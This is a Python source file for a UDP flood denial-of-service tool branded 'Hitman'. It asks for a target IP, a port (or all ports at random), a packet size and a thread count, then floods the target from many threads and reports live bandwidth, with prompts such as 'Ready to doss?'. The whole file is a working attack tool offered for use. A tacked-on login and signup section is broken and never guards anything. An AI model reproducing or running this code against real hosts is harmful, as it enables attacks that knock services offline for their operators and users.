from socket import socket, AF_INET, SOCK_DGRAM

from threading import Thread
from random import choices, randint
from time import time, sleep

from pystyle import *
from getpass import getpass as hinput



class Brutalize:

    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force # default: 1250
        self.threads = threads # default: 100

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        # self.data = self._randbytes()
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):

        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000
        

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

def Login():
    print("Welcome To The Login Menu!")
    question1 = input("Please enter your username: ")
    if question1 == password1:
      question2 = input("Please enter your password: ")
      if question2 == password1:
         print("Details accepted")
        


def SignUp2():
    global password1
    password1 = input("Please enter a password you would like to use: ")
    question2 = input("Is " + password1 + " the correct password you would like to use: ")
    if question2 == "NO":
        SignUp2()
    if question2 == "YES":
        Login
    else:
        print("Incorrect response, please try again")
        SignUp2()


def SignUp1():
    global username1
    username1 = input("Please enter a username you would like to use: ")
    question1 = input("Is " + username1 + " the correct username you would like to use: ")
    if question1 == "NO":
        SignUp1()
    if question1 == "YES":
        SignUp2()
    else:
        print("Incorrect response, please try again")
        SignUp1()
        

def Login1():
    print("[Welcome to Hitman]")
    print("     Ready to doss?")
    print("    Please press any button to continue ")
    print("--------------------------------------")
    Question1 = input("Press anything to get started : ")
    if Question1 == "NO":
        SignUp1()
    if Question1 == "YES":
        print("Login system!")

Login1()




ascii = r'''


   ▄█    █▄     ▄█      ███       ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄   
  ███    ███   ███  ▀█████████▄ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███▀▀▀██▄ 
  ███    ███   ███▌    ▀███▀▀██ ███   ███   ███   ███    ███ ███   ███ 
 ▄███▄▄▄▄███▄▄ ███▌     ███   ▀ ███   ███   ███   ███    ███ ███   ███ 
▀▀███▀▀▀▀███▀  ███▌     ███     ███   ███   ███ ▀███████████ ███   ███ 
  ███    ███   ███      ███     ███   ███   ███   ███    ███ ███   ███ 
  ███    ███   ███      ███     ███   ███   ███   ███    ███ ███   ███ 
  ███    █▀    █▀      ▄████▀    ▀█   ███   █▀    ███    █▀   ▀█   █▀  
                                                                       
       '''



banner = r"""
      _____        _____        _____
 /     \      /     \      /     \
<       >----<       >----<       >
 \_____/      \_____/      \_____/
 /     \      /     \      /     \
<       >----<       >----<       >----.
 \_____/      \_____/      \_____/      \
       \      /     \      /     \      /
        >----<       >----<       >----<
       /      \_____/      \_____/      \_____
       \      /     \      /     \      /     \
        `----<       >----<       >----<       >
              \_____/      \_____/      \_____/
                           /     \      /
                          <       >----'
                           \_____/""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

fluo = Col.purple
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))


def init():
    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title(".H.i.t.m.a.n. .-. .b.y. .S.k.e.e.d.i.".replace('.',''))
    Cursor.HideCursor()


init()


def stage(text, symbol = '...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()


def main():
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))


    ip = input(stage(f"Please entire an IP:  {bpurple}->{white} ", 'CONSOLE :'))
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        error("Error! Please enter a correct IP address.")



    port = input(stage(f"Enter port {bpurple}[{white}press {fluo2}enter{white} to attack all ports{fluo}] {purple}->{fluo2} ", '?'))
    print()

    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Error! Please enter a correct port.")

    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ", '?'))
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            error("Error! Please enter an integer.")


    threads = input(stage(f"Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Error! Please enter an integer.")


    print()
    cport = '' if port is None else f'{purple}:{fluo2}{port}'
    print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')


    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("Error! {fluo2}Attack stopped", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"Attack stopped. {fluo2}{ip}{cport}{white} was dossed with {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
    print('\n')
    sleep(1)

    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))

if __name__ == '__main__':
    main()    